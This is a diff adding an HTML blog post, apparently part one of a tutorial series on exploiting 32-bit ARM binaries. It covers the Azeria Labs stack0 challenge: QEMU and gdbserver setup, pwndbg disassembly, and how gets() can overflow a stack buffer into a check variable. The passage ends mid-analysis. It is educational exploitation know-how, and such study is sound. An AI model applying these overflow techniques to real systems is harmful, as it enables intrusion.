@@ -1,0 +1,288 @@
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Smashing ARM Stack for Fun - Part I</title>
+  <meta name="description" content="Smashing ARM Stack for Fun - Part I">
+
+  <link href='/css/load-lato-fonts.min.css' rel='stylesheet' type='text/css'>
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      root: "/js/MathJax-2.7.7",
+      extensions: ["tex2jax.js"],
+      jax: ["input/TeX","output/HTML-CSS"],
+      tex2jax: {inlineMath: [["\\(","\\)"]]},
+      TeX: {
+        Macros: {
+          
+        }
+      }
+    });
+  </script>
+  <script src='/js/MathJax-2.7.7/MathJax.js' async></script>
+
+  <script src="/js/jquery-3.6.0.min.js"></script>
+
+  <script src='/js/underscore-1.9.1.min.js' ></script>
+
+  <script src='/js/d3-7.4.2.min.js'></script>
+
+  <script src='/js/venn/venn-0.2.14.min.js'></script>
+  <script src='/js/venn/helper.min.js'></script>
+
+  <script src='/js/fix_syntax_highlight.min.js'></script>
+  <link rel="stylesheet" type="text/css" href="/css/tufte.min.css">
+  <link rel="stylesheet" type="text/css" href="/css/latex.min.css">
+
+  <link rel="canonical" href="https://book-of-gehn.github.io/articles/2021/01/14/Smashing-ARM-Stack-for-Fun-Part-I.html">
+
+  <link rel="stylesheet" type="text/css" href="/css/font-awesome-5.min.css">
+
+  <script src='/js/lunr-2.3.9.min.js'></script>
+  <script src='/js/search_index.js'></script>
+  <script src='/js/search.min.js'></script>
+</head>
+<body>
+<header>
+                <hgroup class="header-group">
+        <h1 class="header-title"><a href="/">The Book of Gehn</a></h1>
+                </hgroup>
+                <ul class="header-list">
+                    <li><a href="https://byexamples.github.io">byexample</a></li>
+                    <li><a href="https://bisturi.github.io">bisturi</a></li>
+                    <li>
+                        <a class="raw_link" href="/feed.xml"><img height="16px" width="16px" src="/img/rss-32px.png" /></a>
+                        <a class="raw_link" href="https://github.com/eldipa"><img height="16px" width="16px" src="/img/github.png" /></a>
+                    </li>
+                </ul>
+        
+        
+
+    
+
+    <nav class="group">
+            <form id="blog-search-form">
+                <input type="search" placeholder="+must -not *fuzzy*"></input>
+                <span class="query-error"></span>
+                <span class="controls">
+                    <button type="submit">Filter</button>
+                    <button style="display: none;" id="reset_search" type="reset">Clear</button>
+                </span>
+            </form>
+    </nav>
+
+    <div style="display: none;" id="search_error"></div>
+    <article style="display: none;" class="group" id="search_results">
+    </article>
+</header>
+<article class="group">
+<h1>
+Smashing ARM Stack for Fun - Part I
+</h1>
+<p class="subtitle">
+January 14, 2021
+</p>
+<p>This is the first of a serie of posts about exploiting 32 bits Arm binaries.</p>
+<p>These <a href="https://github.com/azeria-labs/ARM-challenges">challenges</a> were <a href="https://azeria-labs.com/part-3-stack-overflow-challenges/">taken</a> from <a href="https://azeria-labs.com">Azeria Labs</a>.<!--more--></p>
+<h2 id="setup">Setup</h2>
+<p><label for='CkZvciB0aGUgcmVjb3JkczoKCmBgYGNwcApxZW11LXN5c3RlbS1hcm0KICAtTSB2ZXJzYXRpbGVwYgogIC1jcHUgYXJtMTE3NgogIC1tIDI1NgogIC1kcml2ZSAiZmlsZT0yMDIwLTEyLTAyLXJhc3Bpb3MtYnVzdGVyLWFybWhmLWxpdGUuaW1nLGlmPW5vbmUsaW5kZXg9MCxtZWRpYT1kaXNrLGZvcm1hdD1yYXcsaWQ9ZGlzazAiCiAgLWRldmljZSAidmlydGlvLWJsay1wY2ksZHJpdmU9ZGlzazAsZGlzYWJsZS1tb2Rlcm49b24sZGlzYWJsZS1sZWdhY3k9b2ZmIgogIC1uZXQgInVzZXIsaG9zdGZ3ZD10Y3A6OjMwMjItOjIyLGhvc3Rmd2Q9dGNwOjo5OTk5LTo5OTk5IgogIC1kdGIgdmVyc2F0aWxlLXBiLWJ1c3Rlci01LjQuNTEuZHRiCiAgLWtlcm5lbCBrZXJuZWwtcWVtdS01LjQuNTEtYnVzdGVyCiAgLWFwcGVuZCAicm9vdD0vZGV2L3ZkYTIgcGFuaWM9MSIKICAtbm8tcmVib290CiAgLW5ldCBuaWMKICAtbm9ncmFwaGljCmBgYAptYXJnaW5ub3Rlcw==' class='margin-toggle'> &#8853;</label>
+<input type='checkbox' id='CkZvciB0aGUgcmVjb3JkczoKCmBgYGNwcApxZW11LXN5c3RlbS1hcm0KICAtTSB2ZXJzYXRpbGVwYgogIC1jcHUgYXJtMTE3NgogIC1tIDI1NgogIC1kcml2ZSAiZmlsZT0yMDIwLTEyLTAyLXJhc3Bpb3MtYnVzdGVyLWFybWhmLWxpdGUuaW1nLGlmPW5vbmUsaW5kZXg9MCxtZWRpYT1kaXNrLGZvcm1hdD1yYXcsaWQ9ZGlzazAiCiAgLWRldmljZSAidmlydGlvLWJsay1wY2ksZHJpdmU9ZGlzazAsZGlzYWJsZS1tb2Rlcm49b24sZGlzYWJsZS1sZWdhY3k9b2ZmIgogIC1uZXQgInVzZXIsaG9zdGZ3ZD10Y3A6OjMwMjItOjIyLGhvc3Rmd2Q9dGNwOjo5OTk5LTo5OTk5IgogIC1kdGIgdmVyc2F0aWxlLXBiLWJ1c3Rlci01LjQuNTEuZHRiCiAgLWtlcm5lbCBrZXJuZWwtcWVtdS01LjQuNTEtYnVzdGVyCiAgLWFwcGVuZCAicm9vdD0vZGV2L3ZkYTIgcGFuaWM9MSIKICAtbm8tcmVib290CiAgLW5ldCBuaWMKICAtbm9ncmFwaGljCmBgYAptYXJnaW5ub3Rlcw==' class='margin-toggle'/>
+<span class='marginnote'>
+For the records:
+<br /><br />
+<span class="pseudo-pre"><code><span class="highlight-candombe"><span class="n">qemu</span><span class="o">-</span><span class="n">system</span><span class="o">-</span><span class="n">arm</span><span class="w"></span>
+<span class="w">  </span><span class="o">-</span><span class="n">M</span><span class="w"> </span><span class="n">versatilepb</span><span class="w"></span>
+<span class="w">  </span><span class="o">-</span><span class="n">cpu</span><span class="w"> </span><span class="n">arm1176</span><span class="w"></span>
+<span class="w">  </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="mi">256</span><span class="w"></span>
+<span class="w">  </span><span class="o">-</span><span class="n">drive</span><span class="w"> </span><span class="s">&quot;file=2020-12-02-raspios-buster-armhf-lite.img,if=none,index=0,media=disk,format=raw,id=disk0&quot;</span><span class="w"></span>
+<span class="w">  </span><span class="o">-</span><span class="n">device</span><span class="w"> </span><span class="s">&quot;virtio-blk-pci,drive=disk0,disable-modern=on,disable-legacy=off&quot;</span><span class="w"></span>
+<span class="w">  </span><span class="o">-</span><span class="n">net</span><span class="w"> </span><span class="s">&quot;user,hostfwd=tcp::3022-:22,hostfwd=tcp::9999-:9999&quot;</span><span class="w"></span>
+<span class="w">  </span><span class="o">-</span><span class="n">dtb</span><span class="w"> </span><span class="n">versatile</span><span class="o">-</span><span class="n">pb</span><span class="o">-</span><span class="n">buster</span><span class="mf">-5.4.51</span><span class="p">.</span><span class="n">dtb</span><span class="w"></span>
+<span class="w">  </span><span class="o">-</span><span class="n">kernel</span><span class="w"> </span><span class="n">kernel</span><span class="o">-</span><span class="n">qemu</span><span class="mf">-5.4.51</span><span class="o">-</span><span class="n">buster</span><span class="w"></span>
+<span class="w">  </span><span class="o">-</span><span class="n">append</span><span class="w"> </span><span class="s">&quot;root=/dev/vda2 panic=1&quot;</span><span class="w"></span>
+<span class="w">  </span><span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">reboot</span><span class="w"></span>
+<span class="w">  </span><span class="o">-</span><span class="n">net</span><span class="w"> </span><span class="n">nic</span><span class="w"></span>
+<span class="w">  </span><span class="o">-</span><span class="n">nographic</span><span class="w"></span></span></code></span>
+</span></p>
+<p>Let’s <a href="/articles/2020/12/15/Qemulating-Rasbian-ARM.html">spin a Rasbian</a> first. Make your to forward a port for the <code><span class="highlight-candombe-inline"><span class="nf">ssh</span><span class="w"></span></span></code> and another for the <code><span class="highlight-candombe-inline"><span class="nf">gdbserver</span><span class="w"></span></span></code> so we can connect to them from the host machine.</p>
+<p>There are <a href="https://github.com/azeria-labs/ARM-challenges">7 binaries</a> compiled for ARM for 32 bits, not stripped and dynamically linked.</p>
+<p>We will focus on <code><span class="highlight-candombe-inline"><span class="nf">stack0</span><span class="w"></span></span></code> for now.</p>
+<div class="highlight-candombe"><pre><span></span><code>$ file stack0
+stack0: ELF <span class="m">32</span>-bit LSB executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>,
+dynamically linked, interpreter /lib/ld-linux-armhf.so.3,
+<span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32,
+BuildID<span class="o">[</span>sha1<span class="o">]=</span>1171fa6db1d5176af44d6d462427f8d244bd82c8,
+not stripped
+</code></pre></div>
+
+<p>Spin the <code class="none">gdbserver</code>:</p>
+<div class="highlight-candombe"><pre><span></span><code>pi@raspberrypi:~$ gdbserver :9999 stack0
+Process /home/pi/stack0 created<span class="p">;</span> <span class="nv">pid</span> <span class="o">=</span> <span class="m">410</span>
+Listening on port <span class="m">9999</span>
+</code></pre></div>
+
+<p>And now, from the host, connect your <code><span class="highlight-candombe-inline"><span class="nf">gdb</span><span class="w"></span></span></code> to the server. In my case I will use <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>, an enhanced version of <code><span class="highlight-candombe-inline"><span class="nf">gdb</span><span class="w"></span></span></code>.</p>
+<div class="highlight-candombe"><pre><span></span><code>$ gdb-multiarch -q -x ~/scripts/pwndbg.gdbinit
+pwndbg&gt; target extended-remote :9999
+Remote debugging using &lt;...&gt;
+Reading /home/pi/stack0 from remote target...
+</code></pre></div>
+
+<p>In addition to the debugger, I will use an <a href="https://github.com/bad-address/iasm">interactive assembler</a> to play with some Arm code that I may not understand but which I don’t want to run in the debugger (see <a href="/articles/2021/01/09/Interactive-Assembler.html">my post about <code><span class="highlight-candombe-inline"><span class="nf">iasm</span><span class="w"></span></span></code></a>).</p>
+<h2 id="stack-initialization">Stack initialization</h2>
+<p>The stack initialization of <code class="none">main</code> is as follows:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="nf">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">pdisass</span><span class="w"> </span><span class="o">&amp;</span><span class="nv">main</span><span class="w"></span>
+<span class="w"> </span><span class="err">►</span><span class="w"> </span><span class="err">0</span><span class="nf">x1044c</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">&gt;</span><span class="w">       </span><span class="nv">push</span><span class="w">   </span><span class="err">{</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="nv">lr</span><span class="err">}</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10450</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span><span class="w">     </span><span class="nv">add</span><span class="w">    </span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="c1">#4</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10454</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span><span class="w">     </span><span class="nv">sub</span><span class="w">    </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="c1">#0x50</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10458</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">str</span><span class="w">    </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#-0x50]</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x1045c</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">str</span><span class="w">    </span><span class="nb">r1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#-0x54]</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10460</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">mov</span><span class="w">    </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="c1">#0</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10464</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">str</span><span class="w">    </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#-8]</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10468</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">sub</span><span class="w">    </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#0x48</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x1046c</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">mov</span><span class="w">    </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="nb">r3</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10470</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span><span class="w">    </span><span class="nb">bl</span><span class="w">     </span><span class="c1">#gets@plt &lt;gets@plt&gt;</span><span class="w"></span>
+</code></pre></div>
+
+<p>The <code><span class="highlight-candombe-inline"><span class="nf">lr</span><span class="w"></span></span></code> and the <code><span class="highlight-candombe-inline"><span class="nf">fp</span><span class="w"></span></span></code> are pushed in that order (0x8 bytes), the <code><span class="highlight-candombe-inline"><span class="nf">fp</span><span class="w"></span></span></code> is updated and points to the pushed <code><span class="highlight-candombe-inline"><span class="nf">lr</span><span class="w"></span></span></code> (<code><span class="highlight-candombe-inline"><span class="nf">add</span><span class="w"> </span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="c1">#4</span><span class="w"></span></span></code>) and then 0x50 bytes are allocated (<code><span class="highlight-candombe-inline"><span class="nf">sub</span><span class="w"> </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="nb">sp</span><span class="p">,</span><span class="w"> </span><span class="c1">#0x50</span><span class="w"></span></span></code>).</p>
+<p>The arguments of <code class="none">main</code>, registers <code><span class="highlight-candombe-inline"><span class="nf">r0</span><span class="w"></span></span></code> and <code><span class="highlight-candombe-inline"><span class="nf">r1</span><span class="w"></span></span></code>, are saved on <em>top</em> of the stack (<code><span class="highlight-candombe-inline"><span class="nf">str</span><span class="w"> </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#-0x50]</span><span class="w"></span></span></code>, <code><span class="highlight-candombe-inline"><span class="nf">str</span><span class="w"> </span><span class="nb">r1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#-0x54]</span><span class="w"></span></span></code>).</p>
+<p>And then the cookie is stored:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="w">   </span><span class="err">0</span><span class="nf">x10460</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">mov</span><span class="w">    </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="c1">#0</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10464</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">str</span><span class="w">    </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#-8]</span><span class="w"></span>
+</code></pre></div>
+
+<p>This is our target.</p>
+<h2 id="call-to-gets">Call to <code class="none">gets</code></h2>
+<p>In the <code class="none">main</code> function a call to <code class="none">gets</code> is done with a buffer allocated in the stack:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="nf">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">pdisass</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10460</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">mov</span><span class="w">    </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="c1">#0</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10464</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">str</span><span class="w">    </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#-8]</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10468</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">sub</span><span class="w">    </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#0x48</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x1046c</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">mov</span><span class="w">    </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="nb">r3</span><span class="w"></span>
+<span class="w"> </span><span class="err">►</span><span class="w"> </span><span class="err">0</span><span class="nf">x10470</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span><span class="w">    </span><span class="nb">bl</span><span class="w">     </span><span class="c1">#gets@plt &lt;gets@plt&gt;</span><span class="w"></span>
+<span class="w">        </span><span class="nl">r0:</span><span class="w"> </span><span class="err">0</span><span class="nf">xbefffb6c</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mh">0x0</span><span class="w"></span>
+<span class="w">        </span><span class="nl">r1:</span><span class="w"> </span><span class="err">0</span><span class="nf">xbefffd04</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0xbefffe14</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="s">&#39;/home/pi/stack0&#39;</span><span class="w"></span>
+<span class="w">        </span><span class="nl">r2:</span><span class="w"> </span><span class="err">0</span><span class="nf">xbefffd0c</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0xbefffe24</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="s">&#39;SHELL=/bin/bash&#39;</span><span class="w"></span>
+<span class="w">        </span><span class="nl">r3:</span><span class="w"> </span><span class="err">0</span><span class="nf">xbefffb6c</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mh">0x0</span><span class="w"></span>
+</code></pre></div>
+
+<p>The registers before the call to <code class="none">gets</code> were:</p>
+<pre><code>------  ----  ------  ---------  ------  ---------  ------  ------
+    r0  1fb4  r1      eeee:eeee  r2      0          r3      1fb4
+    r4  0     r5      0          r6      0          r7      0
+    r8  0     r9/sb   0          r10     0          r11/fp  1ffc
+r12/ip  0     r13/sp  1fa8       r14/lr  aaaa:aaaa  r15/pc  100:20
+------  ----  ------  ---------  ------  ---------  ------  ------</code></pre>
+<p>And the manually-annotated stack was:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="mi">100</span><span class="p">:</span><span class="mi">20</span><span class="o">&gt;</span> <span class="p">;</span><span class="err">!</span> <span class="n">M</span><span class="p">[</span><span class="n">sp</span><span class="p">:]</span>   <span class="c1"># &lt;-- from sp to the end of the mapped page</span>
+<span class="p">[</span>
+        <span class="o">--</span>
+        <span class="o">|</span>   \<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>   <span class="o">==</span> <span class="n">r1</span>
+        <span class="o">|</span>   \<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>   <span class="o">==</span> <span class="n">r0</span>
+  <span class="mh">0x50</span>  <span class="o">|</span>   \<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>
+        <span class="o">|</span>   <span class="o">...</span> <span class="mi">16</span> <span class="n">more</span> <span class="n">rows</span> <span class="n">full</span> <span class="n">of</span> <span class="n">zeros</span> <span class="o">...</span>
+<span class="n">cookie</span> <span class="o">-|--&gt;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>
+        <span class="o">--</span>
+   <span class="mh">0x8</span>  <span class="o">|</span>   \<span class="n">xbb</span>\<span class="n">xbb</span>\<span class="n">xbb</span>\<span class="n">xbb</span>   <span class="o">==</span> <span class="n">fp</span>
+ <span class="n">fp</span> <span class="o">----|--&gt;</span>\<span class="n">xaa</span>\<span class="n">xaa</span>\<span class="n">xaa</span>\<span class="n">xaa</span>   <span class="o">==</span> <span class="n">lr</span>
+        <span class="o">--</span>
+<span class="p">]</span> <span class="o">&lt;--</span> <span class="n">base</span> <span class="n">of</span> <span class="n">stack</span>
+</code></pre></div>
+
+<p><code><span class="highlight-candombe-inline"><span class="nf">r3</span><span class="w"></span></span></code> points <em>almost</em> to the begin of the bunch of zeros, just 4 bytes below.</p>
+<p>We can verify this writing and inspecting the memory:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="mi">100</span><span class="p">:</span><span class="mi">20</span><span class="o">&gt;</span> <span class="p">;</span><span class="err">!</span> <span class="n">M</span><span class="p">[</span><span class="n">r3</span><span class="p">:]</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;AAAABBBBCCCC&quot;</span>
+<span class="mi">100</span><span class="p">:</span><span class="mi">20</span><span class="o">&gt;</span> <span class="p">;</span><span class="err">!</span> <span class="n">M</span><span class="p">[</span><span class="n">sp</span><span class="p">:]</span>
+<span class="p">[</span>
+        \<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>
+        \<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>
+        \<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>    <span class="o">==</span> <span class="n">these</span> <span class="n">are</span> <span class="n">still</span> <span class="n">zeros</span>
+<span class="n">buf</span> <span class="o">--&gt;</span> <span class="n">AAAA</span>
+        <span class="n">BBBB</span>
+        <span class="n">CCCC</span>
+        \<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>
+        <span class="o">...</span>
+<span class="p">]</span>
+</code></pre></div>
+
+<p>Indeed, the destination buffer of <code class="none">gets</code> has 0x48 - 0x8 bytes (we subtract 4 bytes for the cookie and 4 bytes for the stored <code><span class="highlight-candombe-inline"><span class="nf">fp</span><span class="w"></span></span></code>)</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="mi">100</span><span class="p">:</span><span class="mi">20</span><span class="o">&gt;</span> <span class="p">;</span><span class="err">!</span> <span class="n">M</span><span class="p">[</span><span class="n">sp</span><span class="p">:]</span>
+<span class="p">[</span>
+        <span class="o">--</span>
+        <span class="o">|</span>   \<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>   <span class="o">==</span> <span class="n">r1</span>
+        <span class="o">|</span>   \<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>   <span class="o">==</span> <span class="n">r0</span>
+  <span class="mh">0x50</span>  <span class="o">|</span>   \<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>
+<span class="n">buf</span> <span class="o">----|--&gt;</span><span class="n">AAAA</span>
+        <span class="o">|</span>   <span class="n">BBBB</span>
+        <span class="o">|</span>   <span class="n">CCCC</span>
+        <span class="o">|</span>   <span class="o">...</span> <span class="mi">13</span> <span class="n">more</span> <span class="n">rows</span> <span class="n">full</span> <span class="n">of</span> <span class="n">zeros</span> <span class="o">...</span>
+<span class="n">cookie</span> <span class="o">-|--&gt;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>
+        <span class="o">--</span>
+   <span class="mh">0x8</span>  <span class="o">|</span>   \<span class="n">xbb</span>\<span class="n">xbb</span>\<span class="n">xbb</span>\<span class="n">xbb</span>   <span class="o">==</span> <span class="n">fp</span>
+ <span class="n">fp</span> <span class="o">----|--&gt;</span>\<span class="n">xaa</span>\<span class="n">xaa</span>\<span class="n">xaa</span>\<span class="n">xaa</span>   <span class="o">==</span> <span class="n">lr</span>
+        <span class="o">--</span>
+<span class="p">]</span>
+</code></pre></div>
+
+<h2 id="the-target">The target</h2>
+<p>The program stores a cookie initialized to zero in the stack <em>before</em> the call to <code class="none">gets</code> and then it checks its value.</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="w">   </span><span class="err">0</span><span class="nf">x10460</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">mov</span><span class="w">    </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="c1">#0</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10464</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">str</span><span class="w">    </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#-8]</span><span class="w"></span>
+<span class="w">    </span><span class="nf">...</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10470</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span><span class="w">    </span><span class="nb">bl</span><span class="w">     </span><span class="c1">#gets@plt &lt;gets@plt&gt;</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10474</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">ldr</span><span class="w">    </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">fp</span><span class="p">,</span><span class="w"> </span><span class="c1">#-8]</span><span class="w"></span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x10478</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">cmp</span><span class="w">    </span><span class="nb">r3</span><span class="p">,</span><span class="w"> </span><span class="c1">#0</span><span class="w"></span>
+</code></pre></div>
+
+<p>If it is still zero jumps to a <code class="none">puts</code> that prints <code><span class="highlight-candombe-inline"><span class="err">&quot;</span><span class="nf">Try</span><span class="w"> </span><span class="nv">again?</span><span class="err">&quot;</span><span class="w"></span></span></code>.</p>
+<p>But if an overflow occurs, the cookies will be non-zero and another <code class="none">puts</code> will executed.</p>
+<p>This is the print that we are looking for:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="w">   </span><span class="err">0</span><span class="nf">x10480</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">52</span><span class="o">&gt;</span><span class="w">    </span><span class="nv">ldr</span><span class="w">    </span><span class="nb">r0</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">pc</span><span class="p">,</span><span class="w"> </span><span class="c1">#0x18]</span><span class="w"></span>
+<span class="w"> </span><span class="err">►</span><span class="w"> </span><span class="err">0</span><span class="nf">x10484</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">main</span><span class="o">+</span><span class="mi">56</span><span class="o">&gt;</span><span class="w">    </span><span class="nb">bl</span><span class="w">     </span><span class="c1">#puts@plt &lt;puts@plt&gt;</span><span class="w"></span>
+</code></pre></div>
+
+<p>The address of the string to print is stored in the code segment, 0x18 bytes below the program counter at 0x10480.</p>
+<p>However 0x10480 + 0x18 == 0x10498 is not correct:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="nf">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="nv">x</span><span class="o">/</span><span class="mi">4</span><span class="w"> </span><span class="mh">0x10498</span><span class="w"></span>
